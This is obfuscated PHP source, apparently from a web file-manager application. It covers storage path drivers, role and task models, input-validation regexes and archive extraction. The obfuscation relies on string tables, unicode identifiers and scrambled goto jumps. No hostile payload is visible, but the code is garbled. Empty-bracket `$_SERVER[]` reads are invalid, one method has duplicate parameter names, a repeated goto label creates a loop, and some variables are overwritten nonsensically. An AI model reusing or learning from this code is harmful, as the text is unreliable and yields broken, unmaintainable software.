$D܌Ĉ[$D[367]]; for ($b = 0; $b < count($D܌Ĉ[$D[1120]]); $b++) { $B韌 = $D܌Ĉ[$D[1120]][$b]; if ($b == count($D܌Ĉ[$D[1120]]) - 1) { $e򱤉ϯ = $this->model->mkfile($e򱤉ϯ, $B韌, $f̤Ȯ, $fű); break; } $e򱤉ϯ = $this->model->mkdir($e򱤉ϯ, $B韌, REPEAT_SKIP); } return $this->getPathOuter($e򱤉ϯ); } public function mkdir($Dĩ, $C֎ = REPEAT_SKIP) { $E̎ =& $_SERVER[]; $F = $this->parse($Dĩ); $Dĩ = $F[$E̎[367]]; for ($b = 0; $b < count($F[$E̎[1120]]); $b++) { $F厳Ў = $F[$E̎[1120]][$b]; $Dĩ = $this->model->mkdir($Dĩ, $F厳Ў, $C֎); } return $this->getPathOuter($Dĩ); } public function copyFile($b, $B, $B = REPEAT_REPLACE) { $F̣ =& $_SERVER[]; $A = $this->parse($B); $Eî = $this->model->copy($b, $A[$F̣[367]], $B, $A[$F̣[75]]); return $Eî ? $this->getPathOuter($Eî) : !1; } public function moveFile($eбۗ, $e, $eı = REPEAT_REPLACE) { $FҊ =& $_SERVER[]; $fԑ = $this->parse($e); $d܌ = $this->model->move($eбۗ, $fԑ[$FҊ[367]], $eı, $fԑ[$FҊ[75]]); return $d܌ ? $this->getPathOuter($d܌) : !1; } public function copy($Bԕ˂, $EÒ, $D = REPEAT_REPLACE) { $A˵ɩ = $this->parse($EÒ); $Bʗ = $this->model->copy($Bԕ˂, $A˵ɩ[$_SERVER[][367]], $D); return $Bʗ ? $this->getPathOuter($Bʗ) : !1; } public function moveSameAllow() { } public function move($a, $e咝, $D뇡 = REPEAT_REPLACE) { $b = $this->parse($e咝); $bΌ = $this->model->move($a, $b[$_SERVER[][367]], $D뇡); return $bΌ ? $this->getPathOuter($bΌ) : !1; } public function remove($Aď, $aͧ = true) { return $this->model->remove($Aď, $aͧ); } public function rename($C˫, $Eř) { $E = $this->model->rename($C˫, $Eř); return $E ? $this->getPathOuter($C˫) : $E; } public function size($aÒ) { $dŝ = $this->infoSimple($aÒ); return $dŝ ? $dŝ[$_SERVER[][77]] : 0; } public function infoSimple($f) { return $this->model->sourceInfo($f); } public function info($b֭) { return $this->infoParse($b֭); } public function infoAuth($fñ) { return $this->infoParse($fñ, !1, !0); } public function infoWithChildren($Aꘆ럾) { return $this->infoParse($Aꘆ럾, !0); } protected function infoParse($FǤ, $c = false, $a = false) { if (!$c) { return $this->model->pathInfo($FǤ, $a); } return $this->model->pathInfoMore($FǤ); } public function infoFull($cԻ) { $F٪ =& $_SERVER[]; $b׮Ĝ = explode($F٪[8], $cԻ); $eꨥ = implode($F٪[8], array_splice($b׮Ĝ, 1)); return $this->model->pathInfoByPath($b׮Ĝ[0], $eꨥ); } public function hashSimple($fĵ) { $Eٓ =& $_SERVER[]; $e܏ = $this->infoWithChildren($fĵ); return $e܏[$Eٓ[162]][$Eٓ[164]]; } public function hashMd5($Fՙ) { $F© =& $_SERVER[]; $Cٺ = $this->infoWithChildren($Fՙ); return $Cٺ[$F©[162]][$F©[163]]; } public function exist($f) { $Cɰ =& $_SERVER[]; $Cлĵ = $this->parse($f); if (!$Cлĵ[$Cɰ[75]]) { return $this->isFile($f) || $this->isFolder($f); } $E좲ط = array($Cɰ[368] => $Cлĵ[$Cɰ[367]], $Cɰ[28] => $Cлĵ[$Cɰ[75]]); $fǐ = $this->model->where($E좲ط)->find(); return $fǐ ? !0 : !1; } public function isFile($E) { $A =& $_SERVER[]; $aȐ = $this->infoSimple($E); return $aȐ && $aȐ[$A[370]] == $A[83] ? !1 : !0; } public function isFolder($a̻Ӑ) { $Dשʷ =& $_SERVER[]; $Bï = $this->infoSimple($a̻Ӑ); return $Bï && $Bï[$Dשʷ[370]] == $Dשʷ[83] ? !0 : !1; } public function listPath($Eݒ, $cꗄ = false) { $bګ =& $_SERVER[]; if ($Eݒ == $bګ[33]) { return !1; } $c凂ݺ = array($bګ[368] => $Eݒ); if ($cꗄ) { return $this->model->listSource($c凂ݺ, -1); } return $this->model->listSource($c凂ݺ); } public function has($c, $Dݚ = false, $Bюȵ = null) { $Aҏ =& $_SERVER[]; $BЌ = $this->infoWithChildren($c); if ($Dݚ) { return array($Aҏ[192] => $BЌ[$Aҏ[192]], $Aҏ[191] => $BЌ[$Aҏ[191]]); } return $Bюȵ ? $BЌ[$Aҏ[192]] : $BЌ[$Aҏ[191]]; } public function listAll($a仍) { $c = IO::info($this->pathParse[$_SERVER[][75]]); if (!$c) { return array(); } return $this->model->listAll($a仍); } public function getContent($e) { return $this->model->getContent($e); } public function setContent($a, $Aӟ = '') { return $this->model->setContent($a, $Aӟ); } public function fileSubstr($F, $c̈́, $d) { return $this->model->fileSubstr($F, $c̈́, $d); } public function download($F, $C = '') { $Aǟ = get_path_father($C); $Dر = get_path_this($C); $dٜ = $this->model->fileInfoGet($F); $D = IO::copy($dٜ[$_SERVER[][75]], $Aǟ, !1, $Dر); return $D; } public function setModifyTime($Cͺϫ, $d = '') { $this->model->metaSet($Cͺϫ, $_SERVER[][1121], $d); } public function upload($Cٍ⋒, $E林, $c򉽼 = false, $Dܷ = REPEAT_REPLACE) { $Fṓ =& $_SERVER[]; $f¹ = $this->parse($Cٍ⋒); $fȢË = $this->model->addFile($f¹[$Fṓ[367]], $E林, $f¹[$Fṓ[75]], $c򉽼, $Dܷ); return $this->getPathOuter($fȢË); } public function uploadFileByID($D݆, $B, $e) { $fҰ =& $_SERVER[]; $a۱Ɯ = $this->parse($D݆); $e̔ = $this->model->addFileByFileID($a۱Ɯ[$fҰ[367]], $B, $a۱Ɯ[$fҰ[75]], $e); return $this->getPathOuter($e̔); } public function addFileByRemote($d˻, $Eʇ, $b = array(), $eߦɜ = '', $fݰ) { $c븻ዑ =& $_SERVER[]; $b񆚤 = $this->parse($d˻); $eߦɜ = empty($eߦɜ) ? $b񆚤[$c븻ዑ[75]] : $eߦɜ; $b = $this->model->addFileByRemote($b񆚤[$c븻ዑ[367]], $Eʇ, $eߦɜ, $b, $fݰ); return $this->getPathOuter($b); } public function uploadLink($AԺ, $c˻ = 0) { $A® =& $_SERVER[]; $a햃 = $this->parse($AԺ); $AԺ = Model($A®[546])->createFileName($a햃[$A®[75]]); $DƈŘ = IO::uploadLink($AԺ, $c˻); return $DƈŘ; } public function fileNameAuto($Bł, $c߫, $f = REPEAT_REPLACE, $dÉ = false) { return $this->model->fileNameAuto($Bł, $c߫, $f, $dÉ); } public function fileNameExist($b燐Ƞ, $cԋ) { return $this->model->fileNameExist($b燐Ƞ, $cԋ); } protected function _fileOut($b, $f׿ = false, $b = false, $CŒ = '', $c梛 = false) { goto Bސ; Bސ: $B܊װ =& $_SERVER[]; $B = $this->model->sourceInfo($b); if ($B[$B܊װ[370]] == $B܊װ[83]) { header($B܊װ[1122]); die; } goto cŞ; cŞ: $fޕЦ = $this->model->fileInfoGet($b); $CŒ = $fޕЦ[$B܊װ[163]] ? $fޕЦ[$B܊װ[163]] : $CŒ; $dڂӡ = isset($GLOBALS[$B܊װ[1123]]) ? $GLOBALS[$B܊װ[1123]] : $B[$B܊װ[28]]; goto f̱Ꚏ; f̱Ꚏ: if ($c梛) { return IO::fileOutServer($fޕЦ[$B܊װ[75]], $f׿, $dڂӡ, $CŒ); } IO::fileOut($fޕЦ[$B܊װ[75]], $f׿, $dڂӡ, $CŒ); goto f; f: } public function fileOut($B, $b = false, $C쌳 = false, $DƐ = '') { $this->_fileOut($B, $b, $C쌳, $DƐ); } public function fileOutServer($aש, $E֜ = false, $Dӱ = false, $Cɋ = '') { $this->_fileOut($aש, $E֜, $Dӱ, $Cɋ, !0); } protected function _fileOutImage($Fޮה, $F֮ = 250) { $C =& $_SERVER[]; $CԲ = $this->model->sourceInfo($Fޮה); if ($CԲ[$C[370]] == $C[83]) { show_json($C[1124] . $Fޮה, !1); } $GLOBALS[$C[1123]] = $CԲ[$C[28]]; $E = $this->model->fileInfoGet($Fޮה); IO::fileOutImage($E[$C[75]], $F֮); } public function fileOutImage($a؇, $A = 250) { $this->_fileOutImage($a؇, $A); } public function fileOutImageServer($Fފ, $F׺ = 250) { $this->_fileOutImage($Fފ, $F׺); } public function link($Eʞ粳, $fñԒ = '') { $AԈ = $this->model->fileInfoGet($Eʞ粳); return IO::link($AԈ[$_SERVER[][75]], $fñԒ); } protected function parse($e¡) { $E =& $_SERVER[]; if (strstr($e¡, $E[8]) === !1) { return array($E[385] => intval($e¡), $E[75] => $E[33], $E[1120] => array()); } $c⇹ = explode($E[8], trim($e¡, $E[8])); if (count($c⇹) < 2) { show_tips($e¡ . $E[1125]); } return array($E[385] => intval($c⇹[0]), $E[75] => $c⇹[1], $E[1120] => array_slice($c⇹, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($fɛ) { $this->pathParse = $fɛ; $this->model = Model($_SERVER[][1119]); } public function getPathOuter($d) { $aҖ =& $_SERVER[]; if (!$d) { return $d; } $Aɏ = $this->parse($d); return trim(KodIO::makeShare($this->pathParse[$aҖ[367]], $Aɏ[$aҖ[367]]), $aҖ[8]); } protected function infoParse($cǺ, $EΠ = false, $b = false) { $d՗ =& $_SERVER[]; $FǞ = $this->pathParse[$d՗[367]]; $b = trim($this->pathParse[$d՗[1014]], $d՗[8]); return Action($d՗[1126])->sharePathInfo($FǞ, $b); } public function infoFull($E) { $fފ؂ =& $_SERVER[]; $fŪ = explode($fފ؂[8], trim($E, $fފ؂[8])); if (count($fŪ) > 1) { $A􂣧 = implode($fފ؂[8], array_splice($fŪ, 1)); $aЄ = $this->model->pathInfoByPath($fŪ[0], $A􂣧); if (!$aЄ) { return !1; } $this->pathParse[$fފ؂[1014]] = $aЄ[$fފ؂[369]]; } return $this->infoParse($E); } public function listAll($b) { goto e; bΊ: foreach ($B㒙 as &$c) { check_abort(); $c[$e[391]] = $e蘰҂->_shareItemeParse($c[$e[391]], $C); } return $B㒙; goto aǍݻ; e: $e =& $_SERVER[]; $fݡ = IO::info($this->pathParse[$e[75]]); if (!$fݡ) { return array(); } goto A; A: $B㒙 = $this->model->listAll($b); $C = Model($e[538])->getInfo($fݡ[$e[441]]); $e蘰҂ = Action($e[1126]); goto bΊ; aǍݻ: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($e) { $this->pathParse = $e; $this->model = Model($_SERVER[][1119]); } protected function infoParse($cϭ, $f = false, $Eє = false) { $f؎ =& $_SERVER[]; return Action($f؎[1020])->sharePathInfo($this->pathParse[$f؎[75]], !0); } public function listPath($Eя, $CƑԝ = false) { $C =& $_SERVER[]; $e䄨 = parent::listPath($Eя, $CƑԝ); foreach ($e䄨 as $bԘ => $aƣ) { if (!in_array($bԘ, array($C[73], $C[74]))) { continue; } foreach ($aƣ as $C => $fܐ) { $e䄨[$bԘ][$C] = Action($C[1020])->shareItemInfo($fܐ); } } return $e䄨; } public function listAll($aǤ) { $eң =& $_SERVER[]; $cВ = IO::info($this->pathParse[$eң[75]]); if (!$cВ) { return array(); } $a = $this->model->listAll($aǤ); foreach ($a as &$e) { $e[$eң[391]] = Action($eң[1020])->shareItemInfo($e[$eң[391]]); } return $a; } } goto d챊; Dȿ: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\x2e\162\x6f\154\145\x4c\151\x73\x74"; public $field = array("\156\141\155\x65", "\x61\165\x74\150", "\154\141\x62\x65\154", "\144\x69\163\160\x6c\141\171", "\163\171\x73\x74\145\x6d", "\x64\145\x73\x63", "\x69\x67\x6e\157\x72\x65\x45\170\164", "\x69\147\156\x6f\x72\145\x46\151\154\x65\x53\x69\172\145", "\141\144\155\151\x6e\x69\x73\x74\162\x61\164\x6f\x72", "\x73\x6f\162\164"); public function listData($d빈 = false, $fŰ = "\x73\157\x72\164", $B = false) { $eϚξ =& $_SERVER[]; $e = parent::listData($d빈, $fŰ, $B); if (!$d빈) { $B = $eϚξ[2503]; foreach ($e as $A => $b߈ˈ) { if ($b߈ˈ[$eϚξ[2504]] == 1) { $e[$A][$eϚξ[405]] = $B; } } } return $e; } public function update($C񎂿, $Eǎ) { goto f䤄; cɫ: return parent::update($C񎂿, $Eǎ); goto aמÈ; dŗ: if (!$bл || $e߳ && $e߳[$Eˏ[367]] != $bл[$Eˏ[367]]) { return !1; } if ($e߳[$Eˏ[2504]] == 1) { $Eǎ = array($Eˏ[28] => $Eǎ[$Eˏ[28]], $Eˏ[2126] => $Eǎ[$Eˏ[2126]]); } $this->filterAuth($Eǎ[$Eˏ[376]]); goto cɫ; f䤄: $Eˏ =& $_SERVER[]; $bл = parent::listData($C񎂿); $e߳ = $this->findByName($Eǎ[$Eˏ[28]]); goto dŗ; aמÈ: } public function remove($eƚ) { $d = parent::listData($eƚ); if (!$d || $d[$_SERVER[][1082]]) { return !1; } return parent::remove($eƚ); } public function add($B컣) { goto dø; dø: $cݣٰ =& $_SERVER[]; $fѯ = $B컣[$cݣٰ[28]]; if ($this->findByName($fѯ)) { return !1; } goto c; d˥: return parent::insert($B컣); goto B; c: $bѬ = array($cݣٰ[386] => $fѯ, $cݣٰ[2114] => $cݣٰ[33], $cݣٰ[2110] => $cݣٰ[2127], $cݣٰ[2505] => 1, $cݣٰ[2113] => 0, $cݣٰ[2506] => 0, $cݣٰ[2112] => $this->getSort()); $B컣 = array_merge($bѬ, $B컣); $this->filterAuth($B컣[$cݣٰ[376]]); goto d˥; B: } private function getSort() { $f莘 =& $_SERVER[]; $cƃ = parent::listData(); $BƟ = array_to_keyvalue($cƃ, $f莘[33], $f莘[2129]); return empty($BƟ) ? 0 : max($BƟ) + 1; } private function filterAuth(&$c) { $dƤ =& $_SERVER[]; $a = array(); $D = array_filter(explode($dƤ[47], $c)); foreach ($D as $c) { $d箻 = explode($dƤ[91], $c); if ($d箻[0] == $dƤ[1785] && $d箻[1] != $dƤ[1038]) { $a = $d箻[0] . $dƤ[91] . $d箻[1] . $dƤ[2507]; if (!in_array($a, $D)) { $a[] = $a; } } $a[] = $c; } $c = implode($dƤ[47], $a); } public function sort($fټ, $Aؒ) { return parent::update($fټ, $Aؒ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\x6d\x2e\x74\141\163\153\x4c\151\x73\164"; public $field = array("\156\x61\x6d\145", "\x74\x79\x70\x65", "\145\166\x65\x6e\164", "\164\x69\x6d\x65", "\144\145\163\x63", "\x73\171\163\164\x65\155", "\145\x6e\141\x62\154\x65", "\x6c\141\x73\x74\x52\x75\x6e", "\163\x6f\x72\x74"); public function listData($c = false, $Cؓ = "\163\x6f\162\x74", $bѸ = false) { return parent::listData($c, $Cؓ, $bѸ); } public function add($cגȆ) { $Dƙ =& $_SERVER[]; $A奰 = $this->findByName($cגȆ[$Dƙ[28]]); if ($A奰) { return !1; } $cגȆ[$Dƙ[1402]] = 0; $cגȆ[$Dƙ[2129]] = $this->getSort(); return parent::insert($cגȆ); } private function getSort() { $bխ =& $_SERVER[]; $f胏Ө = parent::listData(); $C̍ = array_to_keyvalue($f胏Ө, $bխ[33], $bխ[2129]); return empty($C̍) ? 0 : max($C̍) + 1; } public function update($B놷, $fǎǍ) { $AŦ =& $_SERVER[]; $bɫ = $this->listData($B놷); $a = $this->findByName($fǎǍ[$AŦ[28]]); if (!$bɫ || $a && $a[$AŦ[367]] != $bɫ[$AŦ[367]]) { return !1; } return parent::update($B놷, $fǎǍ); } public function remove($C, $c = false) { $aז𴥒 =& $_SERVER[]; $D = $this->listData($C); if (!$D) { return; } if (!$c && $D[$aז𴥒[1082]] == $aז𴥒[83]) { return !1; } return parent::remove($C); } public function enable($bא, $a) { return $this->update($bא, array($_SERVER[][2497] => $a)); } public function run($b) { return $this->update($b, array($_SERVER[][2508] => time())); } } goto aֿݏ; Bϭ: class Input { public static function getArray($DƋ) { goto c˪; E: $b = array(); $bƢ = LNG($d[1880]); foreach ($DƋ as $a => $d) { goto c; f: if (!array_key_exists($a, $in)) { if (array_key_exists($d[1882], $d)) { if (!is_null($d[$d[1882]])) { $A[$d܆ń] = $d[$d[1882]]; } } else { if (isset($d[$d[1883]])) { $b[] = $f볏; } } continue; } if (isset($d[$d[1883]]) && $d[$d[1883]] == $d[282]) { $eֳ = json_decode($in[$a], !0); if (is_array($eֳ)) { $A[$d܆ń] = $eֳ; } else { if (array_key_exists($d[1882], $d)) { if (!is_null($d[$d[1882]])) { $A[$d܆ń] = $d[$d[1882]]; } } else { $b[] = $f볏; } } continue; } $eٻ = _get($d, $d[1014]); goto c˯; c˯: if (isset($d[$d[1883]]) && !self::check($in[$a], $d[$d[1883]], $eٻ)) { if (array_key_exists($d[1882], $d)) { if (!is_null($d[$d[1882]])) { $A[$d܆ń] = $d[$d[1882]]; } } else { $b[] = $f볏; } continue; } $A[$d܆ń] = $in[$a]; goto Aߋҋ; c: $f볏 = _get($d, $d[1248], $bƢ . $d[881] . $a); $d܆ń = $a; if (isset($d[$d[1881]]) && $d[$d[1881]]) { $d܆ń = $d[$d[1881]]; } goto f; Aߋҋ: } goto C; c˪: $d =& $_SERVER[]; global $in; $A = array(); goto E; C: if (count($b) > 0) { show_json(implode($d[1884], $b), !1); } return $A; goto A俠; A俠: } public static function reg($F = "\x72\x65\161\x75\151\x72\x65") { static $Fפۑ = array("\162\x65\161\x75\151\x72\x65" => "\56\53", "\x6e\x75\x6d\x62\x65\x72" => "\x5c\x64\x2b", "\151\x6e\164\145\147\x65\162" => "\134\144\53", "\x68\x65\170" => "\x5b\x30\x2d\71\x41\55\106\141\55\146\x5d\x2b", "\x69\x6e\x74" => "\133\55\x5c\53\x5d\77\x5c\x64\53", "\142\157\x6f\x6c" => "\x30\174\x31", "\x66\x6c\x6f\141\164" => "\x5b\x2d\x5c\53\x5d\x3f\134\x64\53\x28\x5c\56\134\144\53\x29\x3f", "\x65\x6e\147\154\x69\163\x68" => "\x5b\x41\x2d\x5a\x61\55\x7a\x20\x5d\53", "\x63\x68\x69\x6e\x65\x73\x65" => "\x5b\x5c\x78\x7b\x34\145\x30\x30\175\x2d\x5c\170\x7b\x39\146\141\x35\175\x5d\x2b", "\150\x61\163\x43\x68\151\x6e\145\x73\x65" => "\57\x28\133\134\170\173\64\145\x30\60\x7d\x2d\x5c\x78\173\x39\146\x61\65\x7d\135\x2b\x29\x2f\x75", "\x65\x6d\141\x69\154" => "\x5c\167\53\x28\x5b\134\56\134\55\135\x5c\167\53\51\x2a\x5c\x40\134\167\53\x28\x5b\x5c\x2e\134\55\135\134\167\x2b\x29\x2a\x5c\56\134\x77\53", "\x70\150\157\x6e\145" => "\61\x5b\x33\55\71\x5d\134\x64\173\x39\x7d", "\x74\145\154\x70\150\157\x6e\145" => "\50\134\50\134\144\173\63\54\64\175\x5c\x29\174\x5c\144\173\63\54\x34\x7d\55\x7c\134\163\x29\x3f\134\x64\x7b\x37\x2c\61\64\x7d", "\x75\x72\x6c" => "\x28\x68\x74\x74\160\x7c\x66\164\x70\x7c\x68\164\164\x70\x73\x29\x3a\x5c\x2f\134\57\x5b\x5c\x77\134\55\137\x5d\53\50\x5c\x2e\133\134\167\134\x2d\137\135\53\x29\53\50\x5b\134\x77\134\x2d\134\x2e\54\x40\x3f\x5e\x3d\x25\46\72\x5c\x2f\x7e\134\53\x23\x5d\52\x5b\134\x77\134\x2d\x5c\x40\77\136\75\45\46\134\x2f\176\x5c\x2b\43\135\51\x3f", "\x75\x72\x6c\x46\x75\154\x6c" => "\133\x61\55\x7a\x41\55\x7a\x5d\53\72\x5c\x2f\x5c\x2f\133\136\134\163\135\52", "\151\x70" => "\x28\x5c\144\173\x31\x2c\x33\175\x5c\56\x29\173\63\175\x28\x5c\x64\173\61\x2c\63\175\x29", "\x7a\x69\160" => "\x5b\x31\x2d\x39\x5d\x5c\144\x7b\65\x7d\x28\77\x21\134\144\51", "\x69\x64\103\141\162\x64" => "\50\x5c\x64\173\x31\x35\x7d\x29\x7c\50\x5c\x64\x7b\x31\67\175\50\134\x64\x7c\x58\x7c\170\51\x29", "\x63\x6f\x6c\157\x72" => "\43\50\133\60\x2d\x39\101\55\x46\141\55\146\135\x7b\x33\x7d\174\x5b\60\55\x39\101\55\x46\141\55\x66\x5d\x7b\66\175\x29", "\x74\151\x6d\145" => "\50\133\60\x2d\x31\x5d\134\x64\174\62\x5b\60\x2d\64\135\x29\72\x5b\60\55\x35\135\134\144", "\144\141\164\x65" => "\134\144\173\x34\x7d\x5b\x2d\x5c\57\135\77\x28\60\133\x31\55\71\x5d\x7c\61\133\60\55\62\135\x29\133\55\x5c\57\135\77\50\x5b\60\55\x32\x5d\x5c\144\x7c\63\133\60\x2d\x31\x5d\51", "\144\x61\164\x65\x54\151\155\x65" => "\134\144\x7b\64\x7d\133\x2d\134\x2f\x5d\77\x28\x30\x5b\61\55\x39\135\x7c\61\x5b\60\55\x32\135\x29\x5b\55\134\57\135\77\50\133\x30\x2d\62\x5d\134\x64\174\63\133\x30\x2d\61\135\51\134\x73\53\50\x5b\x30\x2d\x31\135\x5c\144\x7c\62\133\x30\55\x34\x5d\51\72\133\60\55\65\x5d\x5c\144", "\160\x61\x73\163\167\157\x72\144" => "\x28\x3f\75\x2e\52\134\x64\x29\x28\x3f\75\56\52\133\141\55\172\x5d\51\50\x3f\75\56\52\x5b\101\55\132\135\51\56\x7b\70\x2c\x32\x30\175", "\x6b\x65\x79" => "\x5b\101\x2d\x5a\141\55\172\x30\x2d\71\x5f\134\x2d\x5c\56\x5d\53", "\x6b\x65\171\x46\x75\x6c\x6c" => "\x5b\x41\55\x5a\x61\55\172\x30\x2d\71\137\x5c\x2d\134\x2e\134\163\54\x5d\x2b"); if (!$F) { return $Fפۑ; } return $Fפۑ[$F]; } public static function check($EҚ, $Cڡ, $b = null) { $Fߩ =& $_SERVER[]; switch ($Cڡ) { case $Fߩ[7]: return in_array($EҚ, $b); break; case $Fߩ[1885]: return floatval($EҚ) > $b; break; case $Fߩ[1886]: return floatval($EҚ) < $b; break; case $Fߩ[325]: return strlen($EҚ) >= $b[0] && strlen($EҚ) <= $b[1]; break; case $Fߩ[325]: if (is_array($b)) { return strlen($EҚ) >= $b[0] && strlen($EҚ) <= $b[1]; break; } else { return strlen($EҚ) == $b; break; } case $Fߩ[321]: return floatval($EҚ) >= $b[0] && floatval($EҚ) <= $b[1]; break; } $B攏 = self::reg(!1); $Cڡ = isset($B攏[$Cڡ]) ? $B攏[$Cڡ] : $Cڡ; if (substr($Cڡ, 0, 1) != $Fߩ[8]) { $Cڡ = $Fߩ[1887] . $Cڡ . $Fߩ[1888]; } return preg_match($Cڡ, $EҚ) === 1; } public static function get($e, $d댚 = null, $bʊٽ = null, $Bª = null) { goto b; e: if (!is_null($Bª)) { $dѹ[$d䬢[1014]] = $Bª; } if (!is_null($d댚)) { $dѹ[$d䬢[1883]] = $d댚; } $D = Input::getArray(array($e => $dѹ)); goto e҃; b: $d䬢 =& $_SERVER[]; $dѹ = array(); if (!is_null($bʊٽ)) { $dѹ[$d䬢[34]] = $bʊٽ; } goto e; e҃: return $D[$e]; goto d֏; d֏: } } class KodArchive { static function init() { goto fɣǥ; C: define($eОܪ[1891], TEMP_FILES); define($eОܪ[1892], TEMP_FILES); define($eОܪ[1893], $eОܪ[1894]); goto C; C: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $eОܪ[1895]; require_once ARCHIVE_LIB . $eОܪ[1896]; goto cٯ; cٯ: require_once ARCHIVE_LIB . $eОܪ[1897]; require_once ARCHIVE_LIB . $eОܪ[1898]; require_once ARCHIVE_LIB . $eОܪ[1899]; goto fކ; fކ: require_once ARCHIVE_LIB . $eОܪ[1900]; goto e; fɣǥ: $eОܪ =& $_SERVER[]; if (defined($eОܪ[1889])) { return; } define($eОܪ[1889], SDK_DIR . $eОܪ[1890]); goto C; e: } static function checkIfType($b㢏, $F㐅) { goto E좏·; Eڃ߳: $F݉ = in_array($b㢏, $b[$F㐅]); if ($F݉ && ($F㐅 == $Aۦօ[301] || $F㐅 == $Aۦօ[1904]) && (!function_exists($Aۦօ[1912]) || !function_exists($Aۦօ[1913]))) { show_tips($Aۦօ[1914]); } if ($F݉ && $F㐅 == $Aۦօ[1047] && (!function_exists($Aۦօ[1915]) || !strstr(shell_exec($Aۦօ[1916]), $Aۦօ[1917]))) { show_tips($Aۦօ[1918]); } goto cҬ; E좏·: $Aۦօ =& $_SERVER[]; self::init(); $b = array($Aۦօ[301] => array($Aۦօ[301], $Aۦօ[1901], $Aۦօ[1902], $Aۦօ[1903]), $Aۦօ[1904] => array($Aۦօ[1904], $Aۦօ[1905], $Aۦօ[1045], $Aۦօ[1043]), $Aۦօ[1047] => array($Aۦօ[1047], $Aۦօ[1906], $Aۦօ[1907], $Aۦօ[1908], $Aۦօ[1909], $Aۦօ[1910], $Aۦօ[1911])); goto Eڃ߳; cҬ: return $F݉; goto DЄ; DЄ: } static function listContent($Dߏ, $f膊 = true) { $Dҥ =& $_SERVER[]; self::init(); $D˓ = !empty($GLOBALS[$Dҥ[1051]]) ? $GLOBALS[$Dҥ[1051]] : get_path_ext($Dߏ); $a̒ = !1; if (self::checkIfType($D˓, $Dҥ[1904])) { $Dݶײ = PclTarList($Dߏ, $D˓); $a̒ = array(); for ($Aӟ = 0; $Aӟ < count($Dݶײ); $Aӟ++) { $d = $Dݶײ[$Aӟ]; if ($d[$Dҥ[1919]] == $Dҥ[1920] || $d[$Dҥ[1919]] == $Dҥ[1921]) { continue; } if ($f膊) { $d[$Dҥ[1922]] = ltrim($d[$Dҥ[1922]], $Dҥ[1157]); } if ($d[$Dҥ[1919]] == $Dҥ[1923]) { $d[$Dҥ[76]] = !0; } else { $d[$Dҥ[76]] = !1; } $d[$Dҥ[1038]] = $Aӟ; $a̒[] = $d; } } else { if (self::checkIfType($D˓, $Dҥ[1047])) { $F֭ = kodRarArchive::listContent($Dߏ); if (!$F֭[$Dҥ[1034]]) { return $F֭; } else { $a̒ = $F֭[$Dҥ[1036]]; } } else { if (kodZipArchive::support($Dҥ[354])) { $a̒ = kodZipArchive::listContent($Dߏ); } else { $F = new PclZip($Dߏ); $a̒ = $F->listContent(); } } } if ($a̒) { $Aۻ = unzip_charset_get($a̒); $f膊 = $f膊 && function_exists($Dҥ[65]); for ($Aӟ = 0; $Aӟ < count($a̒); $Aӟ++) { $a̒[$Aӟ][$Dҥ[1922]] = str_replace(array($Dҥ[1074], $Dҥ[1924]), $Dҥ[762], $a̒[$Aӟ][$Dҥ[1922]]); if ($f膊) { $a̒[$Aӟ][$Dҥ[1922]] = iconv_to($a̒[$Aӟ][$Dҥ[1922]], $Aۻ, $Dҥ[326]); unset($a̒[$Aӟ][$Dҥ[1925]]); } } return array($Dҥ[1034] => !0, $Dҥ[1036] => $a̒); } else { return array($Dҥ[1034] => !1, $Dҥ[1036] => $a̒); } } static function extract($Aԕ, $f枇, $e噎 = "\55\61", &$D񱜒 = false) { goto b; b: $e꛿ =& $_SERVER[]; self::init(); $E춥 = !empty($GLOBALS[$e꛿[1051]]) ? $GLOBALS[$e꛿[1051]] : get_path_ext($Aԕ); goto CֳƝ; A: if (self::checkIfType($E춥, $e꛿[1904])) { if ($e噎 != $e꛿[1033]) { $eͻδ = unzip_pre_name($eͻδ); $fƿ = unzip_pre_name($fƿ); $eȍĮ = PclTarExtractList($Aԕ, array($eͻδ), $f枇, $fƿ, $E춥); } else { $eȍĮ = PclTarExtract($Aԕ, $f枇, $e꛿[361], $E춥); } return array($e꛿[1034] => $eȍĮ, $e꛿[1036] => PclErrorString(!0)); } else { if (self::checkIfType($E춥, $e꛿[1047])) { return kodRarArchive::extract($Aԕ, $f枇, $E춥, $D񱜒); } else { if (kodZipArchive::support($e꛿[1926])) { return kodZipArchive::extract($Aԕ, $f枇, $D񱜒); } else { $E̓ = new PclZip($Aԕ); if ($e噎 != $e꛿[1033]) { $eȍĮ = $E̓->extract(PCLZIP_OPT_PATH, $f枇, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $e꛿[1927], PCLZIP_OPT_BY_NAME, $C׫[$e꛿[1922]], PCLZIP_OPT_REMOVE_PATH, $fƿ, PCLZIP_OPT_REPLACE_NEWER); } else { $eȍĮ = $E̓->extract(PCLZIP_OPT_PATH, $f枇, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $e꛿[1927], PCLZIP_OPT_REPLACE_NEWER); } return array($e꛿[1034] => $eȍĮ, $e꛿[1036] => $E̓->errorName(!0)); } } } return array($e꛿[1034] => !1, $e꛿[1036] => $e꛿[1928]); goto aՒ; CֳƝ: $bﳇɷ = self::listContent($Aԕ, !1); if (!$bﳇɷ[$e꛿[1034]]) { return $bﳇɷ; } if ($e噎 != $e꛿[1033]) { goto bȊ֊; bȊ֊: $C׫ = self::fileIndex($bﳇɷ[$e꛿[1036]], $e噎); $D񱜒 = str_replace(array($e꛿[1074], $e꛿[1924]), $e꛿[70], $C׫[$e꛿[1922]]); $eͻδ = $D񱜒; goto A־; A־: if ($GLOBALS[$e꛿[6]][$e꛿[1155]] != $e꛿[326]) { $eͻδ = unzip_pre_name($D񱜒); } $fƿ = get_path_father($D񱜒); if ($fƿ == $D񱜒) { $fƿ = $e꛿[33]; } goto d; d: if ($C׫[$e꛿[76]]) { $eͻδ = rtrim($eͻδ, $e꛿[8]) . $e꛿[8]; $D񱜒 = array($D񱜒); } $D = str_replace($e꛿[93], $e꛿[8], $eͻδ); if (substr($D, -1) == $e꛿[8]) { if (!strstr(trim($D, $e꛿[8]), $e꛿[8])) { $f枇 = $f枇 . get_path_this($D) . $e꛿[8]; } } else { if ($fƿ == 